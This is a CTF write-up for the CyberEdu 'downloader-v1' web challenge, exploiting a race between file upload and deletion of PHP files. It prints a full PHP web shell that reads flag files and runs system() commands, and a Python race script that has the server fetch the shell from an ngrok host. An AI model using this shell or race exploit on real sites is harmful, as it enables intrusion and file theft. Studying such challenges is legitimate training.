+++
date = '2026-01-12'
draft = false
title = 'CyberEdu downloader-v1 Writeup'
ShowToc = true
tags = ["CyberEdu", "web"]
+++

## Challenge overview

Don't you find it frustrating when you have uploaded some files on a website but you're are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?

---


## Identifying the vulnerabilities

In the GET request, we have a comment pointing us to flag.php, and the /file.php contains "GET ME". Using gobuster, we find a `/uploads/` directory. There's a `/uploads/index.html`, but it's empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image's link?

![challenge-screenshot](look.png#center) 

It created a hash for a /uploads folder, stores the image inside, and removes any files with the `.{php,pht,phtml,php4,php5,php6,php7}` extensions.

The file is then accessible:

![challenge-screenshot](dog.png#center) 

But not the `/uploads/code` one.

Trying to connect to `http://127.0.0.1/.htpasswd` gives us an error that port 80 is not accessible, but the challenge port gives 'invalid url'.

What if we upload a .php file that would do something, and then quickly connect to it before the server removes it? Since there's a lot of actions being done over there, and there's a window where the file exists before it's removed?

Now that I had an idea of what I wanted, I forwarded it to Claude for a quick script. Before, I quickly whipped up a `.php` file and sent it, and we get a little confirmation of my idea:

![challenge-screenshot](hint.png#center) 

Here is the `shell.php`:

```python
<?php
// Disable output buffering for immediate response
@ini_set('output_buffering', 0);
@ini_set('implicit_flush', 1);
ob_implicit_flush(true);

echo "=== PHP SHELL EXECUTED ===\n\n";

// 1. Check for global FLAG variable
if (isset($FLAG)) {
    echo "[FLAG VARIABLE] " . $FLAG . "\n\n";
}

// 2. Try to include/read flag.php
$flag_files = [
    '/var/www/html/flag.php',
    './flag.php',
    '../flag.php',
    '../../flag.php',
    '../../../flag.php',
];

echo "=== SEARCHING FOR FLAG.PHP ===\n";
foreach ($flag_files as $f) {
    if (file_exists($f)) {
        echo "Found: $f\n";
        // Read raw content
        echo "Raw content:\n" . file_get_contents($f) . "\n\n";
        // Try to include it
        include($f);
        echo "\n";
    }
}

// 3. Try common flag locations
echo "\n=== SEARCHING COMMON LOCATIONS ===\n";
$locations = ['/flag.txt', '/flag', '../flag.txt', '../../flag.txt', '/tmp/flag.txt'];
foreach ($locations as $loc) {
    if (file_exists($loc)) {
        echo "Found: $loc\n";
        echo file_get_contents($loc) . "\n\n";
    }
}

// 4. List current directory
echo "\n=== CURRENT DIRECTORY ===\n";
echo "Path: " . getcwd() . "\n";
echo "Files:\n";
print_r(scandir('.'));

// 5. List parent directories
echo "\n\n=== PARENT DIRECTORY ===\n";
if (is_readable('..')) {
    print_r(scandir('..'));
}

// 6. Show all defined variables (might contain flag)
echo "\n\n=== DEFINED VARIABLES ===\n";
$vars = get_defined_vars();
foreach ($vars as $key => $val) {
    if (!is_array($val) && !is_object($val)) {
        echo "$key = $val\n";
    }
}

// 7. Try shell commands
echo "\n\n=== SHELL COMMANDS ===\n";
if (function_exists('system')) {
    echo "Using system():\n";
    system('cat /var/www/html/flag.php 2>&1');
    echo "\n";
    system('cat ../../flag.php 2>&1');
    echo "\n";
    system('find /var/www -name "*flag*" 2>&1');
}

echo "\n=== END ===\n";
?>
```

Here is the python script:

```python
#!/usr/bin/env python3
import requests
import threading
import time

# Configuration
TARGET_URL = "http://34.185.208.176:32331"
NGROK_URL = "https://ecfd544c5949.ngrok-free.app/shell.php"
FILENAME = "shell.php"

found = False

def upload():
    """Upload the PHP file"""
    data = {"url": NGROK_URL}
    requests.post(TARGET_URL, data=data, timeout=5)

def race(thread_id):
    """Race to access the file"""
    global found
    target = f"{TARGET_URL}/{FILENAME}"
    
    for i in range(200):
        if found:
            break
        try:
            resp = requests.get(target, timeout=2)
            if resp.status_code == 200 and len(resp.text) > 50:
                found = True
                print(f"\n{'='*60}")
                print(f"[+] SUCCESS on thread {thread_id}!")
                print(f"{'='*60}")
                print(resp.text)
                print(f"{'='*60}\n")
                break
        except:
            pass
        time.sleep(0.002)

def main():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Racing to: {TARGET_URL}/{FILENAME}\n")
    
    # Start racing threads
    threads = []
    for i in range(15):
        t = threading.Thread(target=race, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    time.sleep(0.1)
    
    # Trigger upload
    print("[*] Uploading...")
    upload()
    
    # Wait for threads
    time.sleep(10)
    
    if not found:
        print("[-] Failed to catch the file")

if __name__ == "__main__":
    main()
```

And here is our flag:

![challenge-screenshot](flag.png#center) 

Really proud of this one!


---


As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/downloaderv1.py)**.




